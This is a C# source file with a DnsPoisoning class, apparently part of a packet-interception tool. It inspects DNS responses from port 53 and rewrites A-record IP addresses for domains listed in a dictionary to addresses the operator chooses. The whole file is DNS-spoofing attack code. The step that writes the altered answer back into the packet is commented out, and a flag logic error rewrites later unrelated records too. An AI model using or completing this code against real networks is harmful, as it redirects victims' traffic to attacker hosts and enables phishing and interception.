using InternetCommands.DNSRequest;
using PacketDotNet;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;

namespace ControlTower
{
    public class DnsPoisoning
    {
        public DnsPoisoning()
        {
            Resolutions = new Dictionary<string, IPAddress>();
        }

        public void Poison(ref IPv4Packet packet)
        {
            UdpPacket udp_packet = packet.Extract<UdpPacket>();
            
            if (udp_packet == null || udp_packet.SourcePort != 53)
                return;
            
            DNSRequest dnsRequest = new DNSRequest(udp_packet.Bytes);
            bool updated = false;

            foreach (KeyValuePair<string, IPAddress> valeur in Resolutions)
            {
                foreach (DNSResourceRecord record in dnsRequest.Answers)
                {
                    if (!(record.Details is RFC1035.A field_a))
                        continue;

                    Debug.Print("Domain name: {0}", record.Name);

                    if (record.Name.EndsWith(valeur.Key) || updated)
                    {
                        field_a.ipAddress = valeur.Value;
                        updated = true;
                    }
                }

                if (updated)
                    break;
            }

            //if (updated)
            //    udp_packet = new UdpPacket(new PacketDotNet.Utils.ByteArraySegment(dnsRequest.ToByte()));
        }

        public Dictionary<string, IPAddress> Resolutions {get; private set;}
    }
}
